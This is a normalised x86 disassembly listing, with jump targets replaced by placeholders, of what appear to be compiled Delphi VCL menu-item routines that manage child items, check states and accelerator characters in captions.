cmp eax esi
jg r-xdata
xor esi esi
mov eax ebx
call sub_453b24
cmp esi eax
je r-xdata
mov esi eax
dec esi
mov edi [ ebx + 0x64 ]
mov edx ebx
mov eax edi
call sub_453e54
mov ecx ebx
mov edx esi
mov eax edi
call sub_453c48
sub_453b84
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_453abc
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_453acc
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_453bdc
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x3a ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ ebp + 0x3a ] bl
mov dl 0x1
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebp + 0x64 ] 0x0
je r-xdata
mov eax [ ebp + 0x64 ]
call sub_453abc
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_453acc
mov [ eax + 0x3a ] 0x0
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_453acc
cmp [ eax + 0x3a ] 0x0
je r-xdata
sub_453c48
push ebx
push esi
push edi
push ebp
mov esi ecx
mov edi edx
mov ebx eax
cmp [ esi + 0x64 ] 0x0
je r-xdata
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_451238
mov ebp edi
dec ebp
test ebp ebp
jl r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ ebx + 0x5c ] eax
mov cl [ esi + 0x3f ]
mov edx edi
mov eax ebx
call sub_452124
mov ecx esi
mov edx edi
mov eax [ ebx + 0x5c ]
call sub_41621c
mov [ esi + 0x64 ] ebx
mov [ esi + 0x84 ] ebx
mov [ esi + 0x80 ] sub_453ec0
cmp [ ebx + 0x34 ] 0x0
je r-xdata
mov eax [ ebx + 0x5c ]
cmp ebp [ eax + 0x8 ]
jge r-xdata
mov eax ebx
call sub_453abc
dec eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_452054
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_4161a0
mov al [ eax + 0x3f ]
cmp al [ esi + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_4161a0
mov dl [ eax + 0x3f ]
mov eax esi
call sub_453a60
sub_453cfc
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_451238
cmp [ ebx + 0x5c ] 0x0
je r-xdata
mov eax ebx
call sub_453abc
test eax eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_452054
mov eax ebx
call sub_453abc
cmp esi eax
jl r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_4161a0
mov edi eax
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_416090
xor eax eax
mov [ edi + 0x64 ] eax
xor eax eax
mov [ edi + 0x80 ] eax
mov [ edi + 0x84 ] eax
cmp [ ebx + 0x34 ] 0x0
je r-xdata
sub_453d70
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x39 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
jne r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
jne r-xdata
mov dl [ ebx + 0x38 ]
xor dl 0x1
mov eax ebx
call sub_453994
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_453aa4
test eax eax
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
je r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov eax ebx
call sub_453aa4
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x88 ]
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
mov edx ebx
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
jmp r-xdata
sub_453e38
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_453abc
mov edx eax
mov ecx esi
mov eax ebx
call sub_453c48
pop esi
pop ebx
retn
sub_453e54
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_453e20
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov edx esi
mov eax ebx
call sub_453cfc
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_451238
sub_453e7c
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax esi
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
pop esi
pop ebx
retn
push ebx
mov ecx eax
mov edx esi
mov eax [ esi + 0x84 ]
call [ esi + 0x80 ]
xor eax eax
jmp r-xdata
cmp [ esi + 0x82 ] 0x0
je r-xdata
sub_453ec0
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
push 0x0
mov ecx esi
mov edx ebx
call sub_453ec0
jmp r-xdata
mov eax ebx
call sub_452054
cmp [ ebx + 0x6c ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov eax esi
call sub_455b98
sub_453f18
push ebx
mov ebx eax
cmp [ ebx + 0x4c ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ ebx + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov eax [ ebx + 0x4c ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_42677c
mov [ ebx + 0x4c ] eax
sub_453f40
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov eax [ ebx + 0x44 ]
call sub_4036c0
xor eax eax
mov [ ebx + 0x44 ] eax
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x44 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_4541d4
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_4038bc
mov edx ebx
mov eax edi
call sub_41e274
mov eax ebx
mov si 0xffee
call sub_4038bc
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x44 ] eax
pop edi
pop esi
pop ebx
retn
sub_453fb0
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x4c ] 0x0
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_42677c
mov [ esi + 0x4c ] eax
sub_453fe4
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_453abc
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_453acc
mov edx [ eax ]
call [ edx + 0x40 ]
inc esi
dec ebx
jne r-xdata
sub_454024
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_453e54
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov eax [ esi + 0x34 ]
mov edx ebx
call sub_453e38
jmp r-xdata
mov edx ebx
mov eax esi
call sub_453e38
sub_454088
push ebx
mov ebx eax
cmp dl [ ebx + 0x3d ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x3d ] dl
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebx + 0x3d ] 0x0
je r-xdata
mov eax ebx
call sub_45394c
sub_4540b4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov eax edi
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov al [ edi + 0x95 ]
mov [ esi + 0xa8 ] al
cmp [ esi + 0xa8 ] 0x0
jne r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_453924
cmp [ esi + 0x30 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x69 ]
mov eax esi
call sub_453994
cmp [ esi + 0x38 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x6a ]
mov eax esi
call sub_4539e8
cmp [ esi + 0x39 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x74 ]
mov [ esi + 0x54 ] eax
cmp [ esi + 0x54 ] 0x0
jne r-xdata
test bl bl
je r-xdata
lea eax [ esi + 0x58 ]
mov edx [ edi + 0x7c ]
call sub_404480
cmp [ esi + 0x58 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov edx [ edi + 0x80 ]
mov eax esi
call sub_453b14
cmp [ esi + 0x40 ] 0xffffffff
jne r-xdata
mov dl [ edi + 0x6c ]
mov eax esi
call sub_453a60
cmp [ esi + 0x3f ] 0x0
jne r-xdata
mov dx [ edi + 0x84 ]
mov eax esi
call sub_453af0
cmp [ esi + 0x60 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
call sub_453b04
cmp [ esi + 0x3e ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x88 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x8c ] eax
cmp [ esi + 0x8a ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_4541d4
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_453aa4
cmp edi eax
jne r-xdata
pop edi
pop esi
retn
xor ecx ecx
mov edx edi
mov eax esi
mov si 0xffef
call sub_4038bc
sub_4541f8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_454218
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_454238
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_454258
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_454278
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_454298
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4542b8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4542d8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4542f8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_454318
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_416b68
mov dl [ ebx + 0x39 ]
mov edi esi
mov eax edi
call sub_44e4c8
mov edx [ ebx + 0x54 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x58 ]
mov eax edi
call sub_44e600
mov edx [ ebx + 0x40 ]
mov eax edi
call sub_44e660
mov edx [ ebx + 0x30 ]
mov eax edi
call sub_44e360
mov dl [ ebx + 0x3e ]
mov eax edi
call sub_44e720
push [ ebx + 0x8c ]
push [ ebx + 0x88 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_454390
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_41e4c0
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_453aa4
cmp edi eax
jne r-xdata
cmp edi [ esi + 0x7c ]
jne r-xdata
xor edx edx
mov eax esi
call sub_453f40
jmp r-xdata
cmp edi [ esi + 0x68 ]
jne r-xdata
xor edx edx
mov eax esi
call sub_4543e4
jmp r-xdata
xor edx edx
mov eax esi
call sub_451fe8
sub_4543e4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x7c ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x7c ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x78 ]
call sub_44fc00
mov eax ebx
call sub_454454
pop esi
pop ebx
retn
mov edx [ ebx + 0x78 ]
call sub_44fc44
mov edx ebx
mov eax [ ebx + 0x7c ]
call sub_41e274
sub_45442c
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_45442c
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_4516bc
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_453ec0
mov eax ebx
pop esi
pop ebx
retn
sub_454468
push ebp
mov ebp esp
push ebx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_40cb44
test eax eax
setne bl
test bl bl
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
add edx 0xfffffffc
mov ecx 0x1
xchg edx eax
call sub_40497c
sub_454498
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe8
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_4044c4
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
pop ecx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_45451c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_45463e
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax [ esi ]
call sub_4046e4
test eax eax
jle r-xdata
test bl bl
je r-xdata
mov edi 0x1
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov eax [ esi ]
call sub_4046e4
mov edx eax
sub edx 0x3
inc edx
mov eax [ esi ]
mov ecx 0x3
call sub_40493c
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404828
jne r-xdata
inc edi
dec eax
jne r-xdata
mov bl 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454645
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_404450
retn
mov edx esi
mov ecx [ ebp - 0x8 ]
mov eax r-xdata
call sub_4049c4
push [ esi ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
mov eax esi
mov edx 0x5
call sub_4047a4
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov eax [ esi ]
call sub_4046e4
mov ecx eax
sub ecx 0x3
mov eax [ esi ]
mov edx 0x1
call sub_40493c
push [ ebp - 0x10 ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
push r-xdata
mov eax esi
mov edx 0x6
call sub_4047a4
jmp r-xdata
mov edx [ esi ]
mov dl [ edx + edi - 0x1 ]
mov ecx [ rw-data ]
and edx 0xff
bt [ ecx ] edx
jae r-xdata
sub_45467c
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x40 ] ecx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x19 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_454b1b
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1a ] 0x0
cmp [ ebp - 0x19 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_4044c4
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_454adc
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ ebp - 0x20 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_453abc
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
lea eax [ ebp - 0x34 ]
mov edx [ ebp - 0x4 ]
call sub_4044c4
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x38 ] eax
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454b22
lea eax [ ebp - 0x48 ]
mov edx 0x4
call sub_404450
lea eax [ ebp - 0x34 ]
mov edx 0x3
call sub_404450
lea eax [ ebp - 0x18 ]
call sub_40442c
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
mov eax ebx
call sub_454cd0
test al al
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
inc eax
mov [ ebp - 0x38 ] eax
inc esi
dec [ ebp - 0x38 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_453acc
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_404828
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg [ ebp - 0x1a ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_454498
pop ecx
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebp - 0x10 ]
jle r-xdata
lea ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx 0x1
jmp r-xdata
mov edx esi
mov eax ebx
call sub_453acc
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_453acc
cmp [ eax + 0x30 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4036c0
mov eax [ ebp - 0x20 ]
call sub_4036c0
mov eax [ ebp - 0x14 ]
call sub_4036c0
mov eax [ ebp - 0xc ]
call sub_4036c0
retn
inc eax
mov [ ebp - 0x38 ] eax
xor esi esi
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
push ebp
call sub_454498
pop ecx
mov eax [ ebp - 0x30 ]
call sub_4046e4
cmp ebx eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_453acc
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x3c ]
call sub_456578
mov eax [ ebp - 0x3c ]
lea edx [ ebp - 0x2c ]
call sub_408620
cmp [ ebp - 0x2c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
add eax 0x30
mov edx [ ebp - 0x30 ]
call sub_404480
inc esi
dec [ ebp - 0x38 ]
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_40cb44
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x30 ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x2c ]
call sub_40cb44
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_453acc
push eax
mov edx esi
mov eax ebx
call sub_453acc
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x64 ]
jmp r-xdata
lea ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
dec [ ebp - 0x38 ]
jne r-xdata
inc edi
xor esi esi
lea eax [ ebp - 0x44 ]
push eax
mov ecx 0x1
mov edx ebx
mov eax [ ebp - 0x30 ]
call sub_40493c
mov eax [ ebp - 0x44 ]
lea edx [ ebp - 0x2c ]
call sub_408620
push ebp
mov eax [ ebp - 0x2c ]
call sub_454468
pop ecx
test al al
je r-xdata
inc ebx
jmp r-xdata
push ebp
mov eax [ ebp - 0x2c ]
call sub_454468
pop ecx
test al al
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_40cb44
test eax eax
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x34 ]
call sub_4044c4
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx eax
mov eax [ ebp - 0x20 ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ecx eax
dec ecx
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x70 ]
inc esi
dec edi
jne r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_453acc
add eax 0x30
push eax
mov edx esi
mov eax ebx
call sub_453acc
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x40 ]
call sub_4564e0
mov edx [ ebp - 0x40 ]
pop eax
call sub_404480
mov edx esi
mov eax ebx
call sub_453acc
push eax
mov edx esi
mov eax ebx
call sub_453acc
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x64 ]
lea eax [ ebp - 0x48 ]
push eax
mov eax [ ebp - 0x18 ]
call sub_4046e4
mov edx eax
mov ecx 0x1
mov eax [ ebp - 0x18 ]
call sub_40493c
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x30 ]
xor ecx ecx
call sub_45451c
mov eax [ ebp - 0x18 ]
call sub_4046e4
mov edx eax
lea eax [ ebp - 0x18 ]
mov ecx 0x1
call sub_40497c
lea edx [ ebp - 0x30 ]
mov ecx ebx
mov eax r-xdata
call sub_4049c4
lea eax [ ebp - 0x30 ]
mov ecx ebx
mov edx [ ebp - 0x2c ]
call sub_45451c
jmp r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
jmp r-xdata
sub_454b78
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov [ esp ] 0x0
test bl bl
jne r-xdata
xor eax eax
mov [ esp + 0x4 ] eax
xor ebp ebp
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_453abc
mov edi eax
dec edi
sub edi ebx
jl r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_453abc
mov edi eax
dec edi
sub edi ebx
jl r-xdata
inc edi
mov al [ esp ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_454cfc
test al al
je r-xdata
mov eax esi
call sub_453abc
mov ebx eax
dec ebx
mov edi [ esp + 0x4 ]
sub edi ebx
jg r-xdata
inc edi
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_453acc
call sub_454b54
test al al
je r-xdata
dec edi
mov edx ebx
mov eax esi
call sub_453acc
cmp [ eax + 0x3e ] 0x0
je r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_453acc
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov edx ebx
mov eax esi
call sub_453acc
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
jmp r-xdata
dec ebx
inc edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_453acc
call sub_454b54
test al al
je r-xdata
inc ebx
dec edi
jne r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_453acc
mov ebp eax
jmp r-xdata
cmp [ ebp + 0x3e ] 0x0
je r-xdata
